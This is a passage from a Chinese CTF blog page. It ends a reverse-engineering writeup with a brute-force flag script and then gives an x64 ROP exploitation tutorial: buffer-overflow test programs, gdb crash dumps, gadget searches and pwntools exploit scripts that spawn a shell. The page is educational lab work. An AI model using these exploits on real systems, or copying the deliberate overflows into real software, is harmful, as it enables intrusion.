LABEL_24:
      s1[*(_DWORD *)v20] = (*(_BYTE *)v20 &amp; 0x38 | ~*(_BYTE *)v20 &amp; 0xC7) ^ ((*v17)[1][*(_DWORD *)v20] &amp; 0x38 | ~(*v17)[1][*(_DWORD *)v20] &amp; 0xC7);
    }
    *(_DWORD *)v20 = *(_DWORD *)v20 - 403331085 + 403331086;
  }
  v7 = strlen((*v17)[1]);
  v8 = s1;
  s1[v7] = 0;
  v9 = *v16;
  if ( !strcmp(v8, *v16) )
    HIDWORD(v12) = printf(&quot;yes\n&quot;, v9, v12);
  do
    v10 = (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0;
  while ( !(((y &lt; 10 &amp;&amp; v10) | (unsigned __int8)((y &lt; 10) ^ v10)) &amp; 1) );
  *v19 = 0;
  return *v19;
}
</code></pre><p>代码很多，猛地一看肯定有点蒙，我也是看了人家的writeup才懂。。。<br>关键就在</p>
<pre><code>(((unsigned __int8)((y &lt; 10) ^ ((((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) | (y&lt; 10&amp;&amp; (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) &amp; 1)
</code></pre><p>这段代码里的通过动态调试x，y一直都是0，这个条件始终为真。<br>那么算法逻辑接下来就是</p>
<pre><code>s1[*(_DWORD *)v20] = (*(_BYTE *)v20 &amp; 0x89 | ~*(_BYTE *)v20 &amp; 0x76) ^ ((*v17
)[1][*(_DWORD *)v20] &amp; 0x89 | ~(*v17)[1][*(_DWORD *)v20] &amp; 0x76);
</code></pre><p>最后s1与</p>
<pre><code>0x36,0x62,0x76,0x65,0x7F,0x6D,0x63,0x6B,0x64,0x66,0x55,0x7C,0x63,0x7
F,0x62,0x6B,0x4F,0x65,0x7A,0x76,0x4B,0x7A,0x74,0x71,0x79,0x6A,0x79,0x7A,0x68
,0x72,0x6C,0x62]
</code></pre><p>这串字符比较，爆破脚本如下：</p>
<pre><code>    str=[ 0x36,0x62,0x76,0x65,0x7F,0x6D,0x63,0x6B,
      0x64,0x66,0x55,0x7C,0x63,0x7F,0x62,0x6B,
      0x4F,0x65,0x7A,0x76,0x4B,0x7A,0x74,0x71,
      0x79,0x6A,0x79,0x7A,0x68,0x72,0x6C,0x62]
flag=&quot;&quot;
for i in range(len(str)):
    for j in xrange(32,128):
        if((j&amp;0x89 | ~j&amp;0x76)^(i&amp;0x89 | ~i&amp;0x76)==str[i]):
            flag=flag+chr(j)
print(flag)
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yunnigu.dropsec.xyz/2016/12/05/reverse第二更之问鼎杯2106-6-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yun">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="YungGong">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/12/05/reverse第二更之问鼎杯2106-6-2/" itemprop="url">reverse第二更之问鼎杯2106-6-2</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-12-05T16:30:08+08:00">
                2016-12-05
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>题目提供了一个exe程序和一个文本readme.txt，txt内容如下：<br>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/12/05/reverse第二更之问鼎杯2106-6-2/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yunnigu.dropsec.xyz/2016/11/29/pwn之第二更SUCTF2016/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yun">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="YungGong">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/11/29/pwn之第二更SUCTF2016/" itemprop="url">pwn之第二更SUCTF2016</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-11-29T16:00:48+08:00">
                2016-11-29
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p><a href="http://pan.baidu.com/s/1ge73Bn9">题目链接</a><br>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/11/29/pwn之第二更SUCTF2016/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yunnigu.dropsec.xyz/2016/11/28/python基于numpy解方程组/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yun">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="YungGong">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/11/28/python基于numpy解方程组/" itemprop="url">python基于numpy解方程组</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-11-28T16:12:18+08:00">
                2016-11-28
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>前两天在做hctf的时候遇到一个题目，前年的400分，通过IDA分析可以看出就是一个有22个未知数的方程组的求解。<br>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/11/28/python基于numpy解方程组/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yunnigu.dropsec.xyz/2016/11/21/pwn学习rop之x64篇/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yun">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="YungGong">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/11/21/pwn学习rop之x64篇/" itemprop="url">pwn学习rop之x64篇</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-11-21T16:54:59+08:00">
                2016-11-21
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <a id="more"></a>
<h2 id="linux-64与linux-86的区别"><a href="#linux-64与linux-86的区别" class="headerlink" title="linux_64与linux_86的区别"></a>linux_64与linux_86的区别</h2><p>linux_64与linux_86的区别主要有两点：首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。</p>
<p>我们还是拿实际程序做例子进行讲解,test.c内容如下：</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

void callsystem()
{
    system(&quot;/bin/sh&quot;);
}

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}

int main(int argc, char** argv) {
    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);
    vulnerable_function();
}
</code></pre><p>我们打开ASLR并用如下方法编译：</p>
<pre><code>$ gcc -fno-stack-protector test.c -o test3
</code></pre><p>通过分析源码，我们可以看到想要获取这个程序的shell非常简单，只需要控制PC指针跳转到callsystem()这个函数的地址上即可。因为程序本身在内存中的地址不是随机的，所以不用担心函数地址发生改变。接下来就是要找溢出点了。我们还是用老方法生成一串定位字符串：</p>
<pre><code>gdb-peda$ pattern create 150
&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&apos;
</code></pre><p>然后r输入这个字符串造成程序崩溃</p>
<pre><code>gdb-peda$ r
Starting program: /home/heyuan/桌面/test3 
Hello, World
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA

Program received signal SIGSEGV, Segmentation fault.

 [----------------------------------registers-----------------------------------]
RAX: 0x97 
RBX: 0x0 
RCX: 0x7ffff7b04680 (&lt;__read_nocancel+7&gt;:    cmp    rax,0xfffffffffffff001)
RDX: 0x200 
RSI: 0x7fffffffdc10 (&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA\n&quot;)
RDI: 0x0 
RBP: 0x6c41415041416b41 (&apos;AkAAPAAl&apos;)
RSP: 0x7fffffffdc98 (&quot;AAQAAmAARAAoAA\n&quot;)
RIP: 0x4005e7 (&lt;vulnerable_function+32&gt;:    ret)
R8 : 0x400690 (&lt;__libc_csu_fini&gt;:    repz ret)
R9 : 0x7ffff7de78e0 (&lt;_dl_fini&gt;:    push   rbp)
R10: 0x37b 
R11: 0x246 
R12: 0x4004c0 (&lt;_start&gt;:    xor    ebp,ebp)
R13: 0x7fffffffdd90 --&gt; 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4005e0 &lt;vulnerable_function+25&gt;:    call   0x400490 &lt;read@plt&gt;
   0x4005e5 &lt;vulnerable_function+30&gt;:    nop
   0x4005e6 &lt;vulnerable_function+31&gt;:    leave  
=&gt; 0x4005e7 &lt;vulnerable_function+32&gt;:    ret    
   0x4005e8 &lt;main&gt;:    push   rbp
   0x4005e9 &lt;main+1&gt;:    mov    rbp,rsp
   0x4005ec &lt;main+4&gt;:    sub    rsp,0x10
   0x4005f0 &lt;main+8&gt;:    mov    DWORD PTR [rbp-0x4],edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdc98 (&quot;AAQAAmAARAAoAA\n&quot;)
0008| 0x7fffffffdca0 --&gt; 0xa41416f414152 (&apos;RAAoAA\n&apos;)
0016| 0x7fffffffdca8 --&gt; 0x100000000 
0024| 0x7fffffffdcb0 --&gt; 0x400620 (&lt;__libc_csu_init&gt;:    push   r15)
0032| 0x7fffffffdcb8 --&gt; 0x7ffff7a2e830 (&lt;__libc_start_main+240&gt;:    mov    edi,eax)
0040| 0x7fffffffdcc0 --&gt; 0x0 
0048| 0x7fffffffdcc8 --&gt; 0x7fffffffdd98 --&gt; 0x7fffffffe172 (&quot;/home/heyuan/桌面/test3&quot;)
0056| 0x7fffffffdcd0 --&gt; 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004005e7 in vulnerable_function ()
</code></pre><p>PC指针并没有指向类似于0x41414141那样地址，而是停在了vulnerable_function()函数中。就是因为我们之前提到过的程序使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。但是，虽然PC不能跳转到那个地址，我们依然可以通过栈来计算出溢出点。因为ret相当于“pop rip”指令，所以我们只要看一下栈顶的数值就能知道PC跳转的地址了。</p>
<pre><code>gdb-peda$ x/gx $rsp
0x7fffffffdc98:    0x41416d4141514141
</code></pre><p>在GDB里，x是查看内存的指令，随后的gx代表数值用64位16进制显示。随后我们就可以用pattern.py来计算溢出点。</p>
<pre><code>gdb-peda$ pattern offset 0x41416d4141514141
4702159612987654465 found at offset: 136
</code></pre><p>可以看到溢出点为136字节。我们再构造一次payload，并且跳转到一个小于0x00007fffffffffff的地址，看看这次能否控制pc的指针。</p>
<pre><code>$ python -c &apos;print &quot;A&quot;*136+&quot;ABCDEF\x00\x00&quot;&apos; &gt; payload

gdb-peda$ r &lt; payload 
Starting program: /home/heyuan/桌面/test3 &lt; payload
Hello, World

Program received signal SIGSEGV, Segmentation fault.

 [----------------------------------registers-----------------------------------]
RAX: 0x91 
RBX: 0x0 
RCX: 0x7ffff7b04680 (&lt;__read_nocancel+7&gt;:    cmp    rax,0xfffffffffffff001)
RDX: 0x200 
RSI: 0x7fffffffdc10 (&apos;A&apos; &lt;repeats 137 times&gt;, &quot;BCDEF&quot;)
RDI: 0x0 
RBP: 0x4141414141414141 (&apos;AAAAAAAA&apos;)
RSP: 0x7fffffffdca0 --&gt; 0x7fffffffdd0a --&gt; 0xe550000000000000 
RIP: 0x464544434241 (&apos;ABCDEF&apos;)
R8 : 0x400690 (&lt;__libc_csu_fini&gt;:    repz ret)
R9 : 0x7ffff7de78e0 (&lt;_dl_fini&gt;:    push   rbp)
R10: 0x37b 
R11: 0x246 
R12: 0x4004c0 (&lt;_start&gt;:    xor    ebp,ebp)
R13: 0x7fffffffdd90 --&gt; 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x464544434241
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdca0 --&gt; 0x7fffffffdd0a --&gt; 0xe550000000000000 
0008| 0x7fffffffdca8 --&gt; 0x100000000 
0016| 0x7fffffffdcb0 --&gt; 0x400620 (&lt;__libc_csu_init&gt;:    push   r15)
0024| 0x7fffffffdcb8 --&gt; 0x7ffff7a2e830 (&lt;__libc_start_main+240&gt;:    mov    edi,eax)
0032| 0x7fffffffdcc0 --&gt; 0x0 
0040| 0x7fffffffdcc8 --&gt; 0x7fffffffdd98 --&gt; 0x7fffffffe171 (&quot;/home/heyuan/桌面/test3&quot;)
0048| 0x7fffffffdcd0 --&gt; 0x100000000 
0056| 0x7fffffffdcd8 --&gt; 0x4005e8 (&lt;main&gt;:    push   rbp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000464544434241 in ?? ()
</code></pre><p>可以看到我们已经成功的控制了PC的指针了。所以最终的exp如下：</p>
<pre><code>#!python
#!/usr/bin/env python
from pwn import *

elf = ELF(&apos;level3&apos;)

p = process(&apos;./level3&apos;)
#p = remote(&apos;127.0.0.1&apos;,10001)

callsystem = 0x0000000000400584

payload = &quot;A&quot;*136 + p64(callsystem)

p.send(payload)

p.interactive()
</code></pre><h2 id="使用工具寻找gadgets"><a href="#使用工具寻找gadgets" class="headerlink" title="使用工具寻找gadgets"></a>使用工具寻找gadgets</h2><p>我们之前提到x86中参数都是保存在栈上,但在x64中前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。所以我们需要寻找一些类似于 pop rdi; ret 的这种gadget。如果是简单的gadgets，我们可以通过objdump来查找。但当我们打算寻找一些复杂的gadgets的时候，还是借助于一些查找gadgets的工具比较方便。比较有名的工具有：</p>
<pre><code>ROPEME: https://github.com/packz/ropeme
Ropper: https://github.com/sashs/Ropper
ROPgadget: https://github.com/JonathanSalwan/ROPgadget/tree/master
rp++: https://github.com/0vercl0k/rp
</code></pre><p>这些工具大致功能都差不多，下面结合例子讲一下，程序源码如下：</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;dlfcn.h&gt;
void systemaddr()
{
    void* handle = dlopen(&quot;libc.so.6&quot;, RTLD_LAZY);
    printf(&quot;%p\n&quot;,dlsym(handle,&quot;system&quot;));
    fflush(stdout);
}
void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}
int main(int argc, char** argv) {
    systemaddr();
    write(1, &quot;Hello, World\n&quot;, 13);
    vulnerable_function();
}
</code></pre><p>编译：</p>
<pre><code>gcc -fno-stack-protector test4.c -o test4 -ldl
</code></pre><p>首先目标程序会打印system()在内存中的地址，这样的话就不需要我们考虑ASLR的问题了，只需要想办法触发buffer overflow然后利用ROP执行 system(“/bin/sh”) 。但为了调用 system(“/bin/sh”) ，我们需要找到一个gadget将rdi的值指向“/bin/sh”的地址。于是我们使用ROPGadget搜索一下test4中所有pop ret的gadgets。</p>
<pre><code>$ ROPgadget --binary test4 --only &quot;pop|ret&quot; 
Gadgets information
============================================================
0x00000000004008ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004008ae : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004008b0 : pop r14 ; pop r15 ; ret
0x00000000004008b2 : pop r15 ; ret
0x00000000004008ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004008af : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400700 : pop rbp ; ret
0x00000000004008b3 : pop rdi ; ret
0x00000000004008b1 : pop rsi ; pop r15 ; ret
0x00000000004008ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400601 : ret
0x0000000000400682 : ret 0x2009
</code></pre><p>我们成功的找到了“pop rdi; ret”这个gadget了。也就可以构造我们的ROP链了。</p>
<pre><code>payload = &quot;\x00&quot;*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)
</code></pre><p>另外，因为我们只需调用一次system()函数就可以获取shell，所以我们也可以搜索不带ret的gadgets来构造ROP链。</p>
<pre><code>ROPgadget --binary libc.so --only &quot;pop|call&quot; | grep rdi
0x0000000000195eab : call qword ptr [rdi + rbp*2 - 0x745c0000]
0x000000000019a1e3 : call qword ptr [rdi + rbx + 2]
0x000000000007d8b0 : call qword ptr [rdi]
0x0000000000023e56 : call rdi
0x0000000000106829 : pop rax ; pop rdi ; call rax
0x000000000010682a : pop rdi ; call rax
</code></pre><p>通过搜索结果我们发现，0x0000000000106829 : pop rax ; pop rdi ; call rax也可以完成我们的目标。首先将rax赋值为system()的地址，rdi赋值为“/bin/sh”的地址，最后再调用call rax即可。</p>
<pre><code>payload = &quot;\x00&quot;*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr)
</code></pre><p>所以说这两个ROP链都可以完成我们的目标，随便选择一个进行攻击即可。最终exp如下：</p>
<pre><code>#!python
#!/usr/bin/env python
from pwn import *

libc = ELF(&apos;libc.so&apos;)

p = process(&apos;./test4&apos;)
#p = remote(&apos;127.0.0.1&apos;,10001)

binsh_addr_offset = next(libc.search(&apos;/bin/sh&apos;)) -libc.symbols[&apos;system&apos;]
print &quot;binsh_addr_offset = &quot; + hex(binsh_addr_offset)

#pop_ret_offset = 0x0000000000022a12 - libc.symbols[&apos;system&apos;]
#print &quot;pop_ret_offset = &quot; + hex(pop_ret_offset)

pop_pop_call_offset = 0x0000000000106829 - libc.symbols[&apos;system&apos;]
print &quot;pop_pop_call_offset = &quot; + hex(pop_pop_call_offset)

print &quot;\n##########receiving system addr##########\n&quot;
system_addr_str = p.recvuntil(&apos;\n&apos;)
system_addr = int(system_addr_str,16)
print &quot;system_addr = &quot; + hex(system_addr)

binsh_addr = system_addr + binsh_addr_offset
print &quot;binsh_addr = &quot; + hex(binsh_addr)


#pop_ret_addr = system_addr + pop_ret_offset
#print &quot;pop_ret_addr = &quot; + hex(pop_ret_addr)

pop_pop_call_addr = system_addr + pop_pop_call_offset
print &quot;pop_pop_call_addr = &quot; + hex(pop_pop_call_addr)

p.recv()

#payload = &quot;\x00&quot;*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr) 

payload = &quot;\x00&quot;*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr) 

print &quot;\n##########sending payload##########\n&quot;
p.send(payload)

p.interactive()
</code></pre><p>运行结果如下：</p>
<pre><code>python test4.py 
[*] &apos;/home/heyuan/\xe6\xa1\x8c\xe9\x9d\xa2/libc.so&apos;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process &apos;./test4&apos;: Done
binsh_addr_offset = 0x146de7
pop_pop_call_offset = 0xc1499

##########receiving system addr##########

system_addr = 0x7f17c39f1390
binsh_addr = 0x7f17c3b38177
pop_pop_call_addr = 0x7f17c3ab2829

##########sending payload##########

[*] Switching to interactive mode
$ id
uid=1000(heyuan) gid=1000(heyuan) 组=1000(heyuan),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),130(wireshark)
</code></pre><h2 id="通用gadgets"><a href="#通用gadgets" class="headerlink" title="通用gadgets"></a>通用gadgets</h2><p>因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。</p>
<p>目标程序test5.c源码如下：</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}

int main(int argc, char** argv) {
    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);
    vulnerable_function();
}
</code></pre><p>可以看到这个程序仅仅只有一个buffer overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段, 最后调用system(“/bin/sh”)。因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。我们使用ROPgadget并没有找到类似于pop rdi, ret,pop rsi, ret这样的gadgets。那应该怎么办呢？其实在x64下有一些万能的gadgets可以利用。比如说我们用objdump -d ./test<br>5观察一下__libc_csu_init()这个函数。一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。</p>
<pre><code>00000000004005a0 &lt;__libc_csu_init&gt;:
  4005a0:   48 89 6c 24 d8          mov    %rbp,-0x28(%rsp)
  4005a5:   4c 89 64 24 e0          mov    %r12,-0x20(%rsp)
  4005aa:   48 8d 2d 73 08 20 00    lea    0x200873(%rip),%rbp        # 600e24 &lt;__init_array_end&gt;
  4005b1:   4c 8d 25 6c 08 20 00    lea    0x20086c(%rip),%r12        # 600e24 &lt;__init_array_end&gt;
  4005b8:   4c 89 6c 24 e8          mov    %r13,-0x18(%rsp)
  4005bd:   4c 89 74 24 f0          mov    %r14,-0x10(%rsp)
  4005c2:   4c 89 7c 24 f8          mov    %r15,-0x8(%rsp)
  4005c7:   48 89 5c 24 d0          mov    %rbx,-0x30(%rsp)
  4005cc:   48 83 ec 38             sub    $0x38,%rsp
  4005d0:   4c 29 e5                sub    %r12,%rbp
  4005d3:   41 89 fd                mov    %edi,%r13d
  4005d6:   49 89 f6                mov    %rsi,%r14
  4005d9:   48 c1 fd 03             sar    $0x3,%rbp
  4005dd:   49 89 d7                mov    %rdx,%r15
  4005e0:   e8 1b fe ff ff          callq  400400 &lt;_init&gt;
  4005e5:   48 85 ed                test   %rbp,%rbp
  4005e8:   74 1c                   je     400606 &lt;__libc_csu_init+0x66&gt;
  4005ea:   31 db                   xor    %ebx,%ebx
  4005ec:   0f 1f 40 00             nopl   0x0(%rax)
  4005f0:   4c 89 fa                mov    %r15,%rdx
  4005f3:   4c 89 f6                mov    %r14,%rsi
  4005f6:   44 89 ef                mov    %r13d,%edi
  4005f9:   41 ff 14 dc             callq  *(%r12,%rbx,8)
  4005fd:   48 83 c3 01             add    $0x1,%rbx
  400601:   48 39 eb                cmp    %rbp,%rbx
  400604:   75 ea                   jne    4005f0 &lt;__libc_csu_init+0x50&gt;
  400606:   48 8b 5c 24 08          mov    0x8(%rsp),%rbx
  40060b:   48 8b 6c 24 10          mov    0x10(%rsp),%rbp
  400610:   4c 8b 64 24 18          mov    0x18(%rsp),%r12
  400615:   4c 8b 6c 24 20          mov    0x20(%rsp),%r13
  40061a:   4c 8b 74 24 28          mov    0x28(%rsp),%r14
  40061f:   4c 8b 7c 24 30          mov    0x30(%rsp),%r15
  400624:   48 83 c4 38             add    $0x38,%rsp
  400628:   c3                      retq   
</code></pre><p>我们可以看到利用0x400606处的代码我们可以控制rbx,rbp,r12,r13,r14和r15的值，随后利用0x4005f0处的代码我们将r15的值赋值给rdx, r14的值赋值给rsi,r13的值赋值给edi，随后就会调用call qword ptr [r12+rbx<em>8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx</em>8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。</p>
<p>我们先构造payload1，利用write()输出write在内存中的地址。注意我们的gadget是call qword ptr [r12+rbx*8]，所以我们应该使用write.got的地址而不是write.plt的地址。并且为了返回到原程序中，重复利用buffer overflow的漏洞，我们需要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止。</p>
<pre><code>#rdi=  edi = r13,  rsi = r14, rdx = r15 
#write(rdi=1, rsi=write.got, rdx=4)
payload1 =  &quot;\x00&quot;*136
payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload1 += &quot;\x00&quot;*56
payload1 += p64(main)
</code></pre><p>当我们exp在收到write()在内存中的地址后，就可以计算出system()在内存中的地址了。接着我们构造payload2，利用read()将system()的地址以及“/bin/sh”读入到.bss段内存中。</p>
<pre><code>#rdi=  edi = r13,  rsi = r14, rdx = r15 
#read(rdi=0, rsi=bss_addr, rdx=16)
payload2 =  &quot;\x00&quot;*136
payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload2 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload2 += &quot;\x00&quot;*56
payload2 += p64(main)
</code></pre><p>最后我们构造payload3,调用system()函数执行“/bin/sh”。注意，system()的地址保存在了.bss段首地址上，“/bin/sh”的地址保存在了.bss段首地址+8字节上。</p>
<pre><code>#rdi=  edi = r13,  rsi = r14, rdx = r15 
#system(rdi = bss_addr+8 = &quot;/bin/sh&quot;)
payload3 =  &quot;\x00&quot;*136
payload3 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload3 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload3 += &quot;\x00&quot;*56
payload3 += p64(main)
</code></pre><p>最终exp如下：</p>
<pre><code>#!python
#!/usr/bin/env python
from pwn import *

